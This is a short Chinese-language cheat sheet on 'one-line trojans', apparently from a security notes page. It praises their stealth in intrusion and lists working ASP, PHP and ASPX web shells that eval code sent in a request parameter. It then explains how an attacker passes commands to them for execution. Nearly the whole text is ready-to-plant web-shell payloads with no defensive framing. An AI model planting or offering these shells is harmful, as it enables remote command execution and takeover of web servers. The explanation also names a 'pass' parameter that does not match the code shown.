# 一句话木马

一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。

常用一句话木马 asp一句话木马： `<%execute(request(“value”))%>` php一句话木马： `<?php @eval($_POST[value]);?>` aspx一句话木马： `<%@ Page Language=“Jscript”%>` `<%eval(Request.Item[“value”])%>`

把需要执行的php脚本片段，通过密码pass参数传给服务器端，服务器通过eval函数进行执行。 可以看出，一句话木马的本质是PHP,ASP\(ASPX\)语言具有eval函数，使之具有了动态性，基于动态性，攻击者就可以把命令传给服务器端的一句话木马进行执行。

